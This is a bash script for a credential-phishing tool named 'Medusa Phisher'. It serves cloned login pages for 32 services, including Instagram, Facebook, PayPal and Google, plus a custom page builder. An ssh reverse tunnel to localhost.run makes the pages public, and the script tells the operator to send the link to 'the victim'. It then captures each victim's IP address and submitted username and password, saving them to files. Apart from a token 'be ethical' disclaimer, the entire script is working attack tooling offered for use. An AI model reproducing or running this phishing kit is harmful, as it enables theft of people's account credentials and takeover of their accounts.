#!/bin/bash

# Define text colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
NC='\033[0m' # No Color

# Function to clear the terminal
clear_terminal() {
    clear
}

big_welcome() {
    echo -e "${RED} __    __    ___  _        __   ___   ___ ___    ___      __ __   ____    __  __  _    ___  ____  ${NC}"
    echo -e "${RED}|  |__|  |  /  _]| |      /  ] /   \ |   |   |  /  _]    |  |  | /    |  /  ]|  |/ ]  /  _]|    \ ${NC}"
    echo -e "${RED}|  |  |  | /  [_ | |     /  / |     || _   _ | /  [_     |  |  ||  o  | /  / |  ' /  /  [_ |  D  )${NC}"
    echo -e "${RED}|  |  |  ||    _]| |___ /  /  |  O  ||  \_/  ||    _]    |  _  ||     |/  /  |    \ |    _]|    / ${NC}"
    echo -e "${RED}|  \`  ' ||   [_ |     /   \_ |     ||   |   ||   [_     |  |  ||  _  /   \_ |     ||   [_ |    \ ${NC}"
    echo -e "${RED} \      / |     ||     \     ||     ||   |   ||     |    |  |  ||  |  \     ||  .  ||     ||  .  \${NC}"
    echo -e "${RED}  \_/\_/  |_____||_____|\____| \___/ |___|___||_____|    |__|__||__|__|\____||__|\_||_____||__|\_${NC}"
    return
}



# Clear the terminal
clear_terminal

# Display the big welcome message
big_welcome

# Pause for 3 seconds
sleep 3



# Medusa Phisher
# Author: Adrilaw
# GitHub: github.com/Adrilaw





# Function to open author's GitHub page
open_page() {
    url="https://github.com/Adrilaw"
    open "$url"
}

# Function to get dependencies list
get_dependencies_list() {
    local dependencies=()

    # Extract dependencies mentioned in the script
    while IFS= read -r line; do
        # Check for commands and extract dependencies
        if [[ "$line" == *"xterm"* ]]; then
            dependencies+=("xterm")
        fi
        if [[ "$line" == *"php"* ]]; then
            dependencies+=("php")
        fi
        if [[ "$line" == *"ssh"* ]]; then
            dependencies+=("ssh")
        fi
    done < "$0" # Read from the current script file

    # Remove duplicates
    dependencies=($(echo "${dependencies[@]}" | tr ' ' '\n' | sort -u | tr '\n' ' '))

    # Print the list of dependencies
    echo "${dependencies[@]}"
}

# Function to print a colored line
print_colored_line() {
    echo -e "\e[1;34m-------------------------------------------------------------------\e[0m"
}

# Call the function to get the dependencies list
dependencies_list=$(get_dependencies_list)

# Print the dependencies list with a colored line above
print_colored_line
echo -e "\e[1;33mDependencies list:\e[0m"
echo "$dependencies_list"
print_colored_line



start_server() {
    server=$1
    # Start the server
    echo "Start the server for: $server"
}


trap 'printf "\n"; stop; exit 1' 2

menu() {

#!/bin/bash

# ASCII art for "Medusa"
echo -e "\e[1;94m"
echo "                          __  __          _                   ____  _     _     _  "
echo "                         |  \/  | ___  __| |_   _ ___  __ _  |  _ \| |__ (_)___| |__   ___ _ __  "
echo "                         | |\/| |/ _ \/ _\`| | | / __|/ _\`| | |_) | '_ \| / __| '_ \ / _ \ '__| "
echo "                         | |  | |  __/ (_| | |_| \__ \ (_| | |  __/| | | | \__ \ | | |  __/ |  "  
echo "                         |_|  |_|\___|\__,_|\__,_|___/\__,_| |_|   |_| |_|_|___/_| |_|\___|_|  CODED BY: Adrilaw Github: https://github.com/Adrilaw"
echo -e "\e[1;33m"

# Print menu options
printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;91m Instagram\e[0m      \e[1;92m[\e[0m\e[1;77m17\e[0m\e[1;92m]\e[0m\e[1;91m IGFollowers\e[0m   \e[1;92m[\e[0m\e[1;77m33\e[0m\e[1;92m]\e[0m\e[1;91m Custom    \e[0m\e[1;94m MEDUSA PHISHER  v1.0\e[0m\n"                                
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;91m Facebook\e[0m       \e[1;92m[\e[0m\e[1;77m18\e[0m\e[1;92m]\e[0m\e[1;91m eBay   \e[0m                 \n"
printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;91m Snapchat\e[0m       \e[1;92m[\e[0m\e[1;77m19\e[0m\e[1;92m]\e[0m\e[1;91m Pinterest   \e[0m             \n"
printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;91m Twitter\e[0m        \e[1;92m[\e[0m\e[1;77m20\e[0m\e[1;92m]\e[0m\e[1;91m CryptoCurrency   \e[0m         \n"
printf "\e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;91m Github\e[0m         \e[1;92m[\e[0m\e[1;77m21\e[0m\e[1;92m]\e[0m\e[1;91m Verizon   \e[0m                \n"
printf "\e[1;92m[\e[0m\e[1;77m06\e[0m\e[1;92m]\e[0m\e[1;91m Google\e[0m         \e[1;92m[\e[0m\e[1;77m22\e[0m\e[1;92m]\e[0m\e[1;91m DropBox   \e[0m               \n"
printf "\e[1;92m[\e[0m\e[1;77m07\e[0m\e[1;92m]\e[0m\e[1;91m Spotify\e[0m        \e[1;92m[\e[0m\e[1;77m23\e[0m\e[1;92m]\e[0m\e[1;91m Adobe ID   \e[0m               \n"
printf "\e[1;92m[\e[0m\e[1;77m08\e[0m\e[1;92m]\e[0m\e[1;91m Netflix\e[0m        \e[1;92m[\e[0m\e[1;77m24\e[0m\e[1;92m]\e[0m\e[1;91m Shopify   \e[0m               \n"
printf "\e[1;92m[\e[0m\e[1;77m09\e[0m\e[1;92m]\e[0m\e[1;91m PayPal\e[0m         \e[1;92m[\e[0m\e[1;77m25\e[0m\e[1;92m]\e[0m\e[1;91m Messenger   \e[0m            \n"
printf "\e[1;92m[\e[0m\e[1;77m10\e[0m\e[1;92m]\e[0m\e[1;91m Origin\e[0m         \e[1;92m[\e[0m\e[1;77m26\e[0m\e[1;92m]\e[0m\e[1;91m GitLab   \e[0m                 \n"
printf "\e[1;92m[\e[0m\e[1;77m11\e[0m\e[1;92m]\e[0m\e[1;91m Steam\e[0m          \e[1;92m[\e[0m\e[1;77m27\e[0m\e[1;92m]\e[0m\e[1;91m Twitch   \e[0m                \n"
printf "\e[1;92m[\e[0m\e[1;77m12\e[0m\e[1;92m]\e[0m\e[1;91m Yahoo\e[0m          \e[1;92m[\e[0m\e[1;77m28\e[0m\e[1;92m]\e[0m\e[1;91m MySpace   \e[0m               \n"
printf "\e[1;92m[\e[0m\e[1;77m13\e[0m\e[1;92m]\e[0m\e[1;91m Linkedin\e[0m       \e[1;92m[\e[0m\e[1;77m29\e[0m\e[1;92m]\e[0m\e[1;91m Badoo   \e[0m                 \n"
printf "\e[1;92m[\e[0m\e[1;77m14\e[0m\e[1;92m]\e[0m\e[1;91m Protonmail\e[0m     \e[1;92m[\e[0m\e[1;77m30\e[0m\e[1;92m]\e[0m\e[1;91m VK   \e[0m                     \n"
printf "\e[1;92m[\e[0m\e[1;77m15\e[0m\e[1;92m]\e[0m\e[1;91m Wordpress\e[0m      \e[1;92m[\e[0m\e[1;77m31\e[0m\e[1;92m]\e[0m\e[1;91m Yandex   \e[0m                 \n"
printf "\e[1;92m[\e[0m\e[1;77m16\e[0m\e[1;92m]\e[0m\e[1;91m Microsoft\e[0m      \e[1;92m[\e[0m\e[1;77m32\e[0m\e[1;92m]\e[0m\e[1;91m devianART   \e[0m            \n"

# Add the coded by line
printf "                                                \e[1;94m CODED BY: @Adrilaw  CREDIT TO FOR SITES TEMPLETE: https://github.com/8L4NK/blackeye/\e[0m\n"

read -p $'\n\e[1;92m➜ [\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m' option



if [[ $option == 1 ]]; then
server="instagram"
start

elif [[ $option == 2 ]]; then
server="facebook"
start
elif [[ $option == 3 ]]; then
server="snapchat"
start
elif [[ $option == 4 ]]; then
server="twitter"
start
elif [[ $option == 5 ]]; then
server="github"
start
elif [[ $option == 6 ]]; then
server="google"
start

elif [[ $option == 7 ]]; then
server="spotify"
start

elif [[ $option == 8 ]]; then
server="netflix"
start

elif [[ $option == 9 ]]; then
server="paypal"
start

elif [[ $option == 10 ]]; then
server="origin"
start

elif [[ $option == 11 ]]; then
server="steam"
start

elif [[ $option == 12 ]]; then
server="yahoo"
start

elif [[ $option == 13 ]]; then
server="linkedin"
start

elif [[ $option == 14 ]]; then
server="protonmail"
start

elif [[ $option == 15 ]]; then
server="wordpress"
start

elif [[ $option == 16 ]]; then
server="microsoft"
start

elif [[ $option == 17 ]]; then
server="instafollowers"
start

elif [[ $option == 18 ]]; then
server="shopping"
start

elif [[ $option == 19 ]]; then
server="pinterest"
start

elif [[ $option == 20 ]]; then
server="cryptocurrency"
start

elif [[ $option == 21 ]]; then
server="verizon"
start

elif [[ $option == 22 ]]; then
server="dropbox"
start

elif [[ $option == 23 ]]; then
server="adobe"
start

elif [[ $option == 24 ]]; then
server="shopify"
start

elif [[ $option == 25 ]]; then
server="messenger"
start

elif [[ $option == 26 ]]; then
server="gitlab"
start

elif [[ $option == 27 ]]; then
server="twitch"
start

elif [[ $option == 28 ]]; then
server="myspace"
start

elif [[ $option == 29 ]]; then
server="badoo"
start

elif [[ $option == 30 ]]; then
server="vk"
start

elif [[ $option == 31 ]]; then
server="yandex"
start

elif [[ $option == 32 ]]; then
server="devianart"
start

elif [[ $option == 33 ]]; then
server="create"
createpage
start

else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
menu
fi
}

stop() {
    checklocalhostrun=$(ps aux | grep -o "localhost.run" | head -n1)
    checkphp=$(ps aux | grep -o "php" | head -n1)
    checknode=$(ps aux | grep -o "node" | head -n1)
    if [[ $checklocalhostrun == *'localhost.run'* ]]; then
        pkill -f -2 localhost.run > /dev/null 2>&1
        killall -2 localhost.run > /dev/null 2>&1
    fi
    if [[ $checkphp == *'php'* ]]; then
        pkill -f -2 php > /dev/null 2>&1
        killall -2 php > /dev/null 2>&1
    fi
    if [[ $checknode == *'node'* ]]; then
        pkill -f -2 node > /dev/null 2>&1
        killall -2 node > /dev/null 2>&1
    fi
}


banner() {
    printf "\n"
    printf "\e[1;93m#############################################\e[0m\n"
    printf "\e[1;93m#             BE ETHICAL                    #\e[0m\n"
    printf "\e[1;93m#                                           #\e[0m\n"
    printf "\e[1;93m#                                           #\e[0m\n"
    printf "\e[1;93m#            :) :) :) :) :) :) :)           #\e[0m\n"
    printf "\e[1;93m#                                           #\e[0m\n"
    printf "\e[1;93m#     With great power comes great          #\e[0m\n"
    printf "\e[1;93m#          responsibility                   #\e[0m\n"
    printf "\e[1;93m#                                           #\e[0m\n"
    printf "\e[1;93m#             .--.                          #\e[0m\n"
    printf "\e[1;93m#            |o_o |                         #\e[0m\n"
    printf "\e[1;93m#            |:_/ |                         #\e[0m\n"
    printf "\e[1;93m#           //   \ \                        #\e[0m\n"
    printf "\e[1;93m#          (|     | )                       #\e[0m\n"
    printf "\e[1;93m#         /'\_   _/ \                       #\e[0m\n"
    printf "\e[1;93m#         \___)=(___/                       #\e[0m\n"
    printf "\e[1;93m#                                           #\e[0m\n"
    printf "\e[1;93m#  I'M NOT RESPONSIBLE FOR MISUSE OF SCRIPT #\e[0m\n"
    printf "\e[1;93m#                                           #\e[0m\n"
    printf "\e[1;93m#############################################\e[0m\n"
    printf "\n"
}









createpage() {
    default_cap1="Wi-fi Session Expired"
    default_cap2="Please login again."
    default_user_text="Username:"
    default_pass_text="Password:"
    default_sub_text="Log-In"

    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 1 (Default: Wi-fi Session Expired): \e[0m' cap1
    cap1="${cap1:-${default_cap1}}"

    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 2 (Default: Please login again.): \e[0m' cap2
    cap2="${cap2:-${default_cap2}}"

    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Username field (Default: Username:): \e[0m' user_text
    user_text="${user_text:-${default_user_text}}"

    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Password field (Default: Password:): \e[0m' pass_text
    pass_text="${pass_text:-${default_pass_text}}"

    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Submit field (Default: Log-In): \e[0m' sub_text
    sub_text="${sub_text:-${default_sub_text}}"

    echo "<!DOCTYPE html>" > sites/create/login.html
    echo "<html>" >> sites/create/login.html
    echo "<body bgcolor=\"gray\" text=\"white\">" >> sites/create/login.html
    IFS=$'\n'
    printf '<center><h2> %s <br><br> %s </h2></center><center>\n' $cap1 $cap2 >> sites/create/login.html
    IFS=$'\n'
    printf '<form method="POST" action="login.php"><label>%s </label>\n' $user_text >> sites/create/login.html
    IFS=$'\n'
    printf '<input type="text" name="username" length=64>\n' >> sites/create/login.html
    IFS=$'\n'
    printf '<br><label>%s: </label>' $pass_text >> sites/create/login.html
    IFS=$'\n'
    printf '<input type="password" name="password" length=64><br><br>\n' >> sites/create/login.html
    IFS=$'\n'
    printf '<input value="%s" type="submit"></form>\n' $sub_text >> sites/create/login.html
    printf '</center>' >> sites/create/login.html
    printf '<body>\n' >> sites/create/login.html
    printf '</html>\n' >> sites/create/login.html
}

catch_cred() {
    account=$(grep -o 'Account:.*' sites/$server/usernames.txt | cut -d " " -f2)
    IFS=$'\n'
    password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" $account
    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
    cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Credentials saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
}

getcredentials() {
    printf "\n\e[1;92m[\e[0m*\e[1;92m] Getting credentials...\e[0m\n"
    if [[ -e sites/$server/ip.txt ]]; then
        printf "\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"
        catch_ip
    fi
    if [[ -e sites/$server/usernames.txt ]]; then
        printf "\e[1;92m[\e[0m*\e[1;92m] Credentials Found!\n"
        catch_cred
    fi
}

catch_ip() {
    client_ip=$(cat sites/$server/ip.txt)
    printf "\e[1;92m[\e[0m*\e[1;92m] IP:\e[0m\e[1;77m %s\e[0m\n" $client_ip
}

start() {
    printf "\n"
    printf "1. \e[1;94mLocalhost.run\e[0m\n"  # Adding color to "Localhost.run"
    echo ""
   read -p $'\n\e[1;92m┌──[ Choose the tunneling method: ]──┐\e[0m\n\e[1;92m│                                   │\e[0m\n\e[1;92m└─► ' host

    if [[ $host == 1 ]]; then
        xterm -e "bash -c 'printf \"Starting Localhost.run link...\n\"; ssh -R 80:localhost:5555 nokey@localhost.run'" &
        sleep 2
        start_localhostrun
    fi
}



start_localhostrun() {
    while true; do
        if [[ -e sites/$server/ip.txt ]]; then
            rm -rf sites/$server/ip.txt
        fi
        if [[ -e sites/$server/usernames.txt ]]; then
            rm -rf sites/$server/usernames.txt
        fi

        printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
        cd sites/$server && php -S 127.0.0.1:5555 > /dev/null 2>&1 &
        sleep 2

        printf "\e[1;92m[\e[0m*\e[1;92m] Please send the following link displayed in the xterm terminal to the victim it is output as: \e[0m\e[1;94mhttps://<link>.lhr.life\e[0m\n"


        # Waiting for victim to open link
        printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting for victim to open the link...\e[0m\n"

        # Continuously monitor ip.txt for changes
        while [ true ]; do
            if [[ -s "sites/$server/ip.txt" ]]; then
                printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"
                catch_ip
                printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting for credentials...\e[0m\n"
                break # Exit the loop after displaying IP
            fi
            sleep 1
        done

        # Continuously monitor usernames.txt for changes
        while [ true ]; do
            if [[ -s "sites/$server/usernames.txt" ]]; then
                printf "\n\e[1;92m[\e[0m*\e[1;92m] Credentials Found!\n"
                catch_cred
                break # Exit the loop after finding credentials
            fi
            sleep 1
        done

        # Waiting for other victim to open link
        printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting for other victim to open link...\e[0m\n"
    done
}











checkfound() {
    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting victim open the link ...\e[0m\n"
    while [ true ]; do
        if [[ -e "sites/$server/ip.txt" ]]; then
            printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"
            catch_ip
        fi
        sleep 1
    done
}

# Main script starts here

# Remove unnecessary files
rm -rf setup.sh
rm -rf tmxsp.sh
rm -rf index.html
rm -rf .gitignore
rm -rf .nojekyll

# Display banner and start the menu
banner
menu
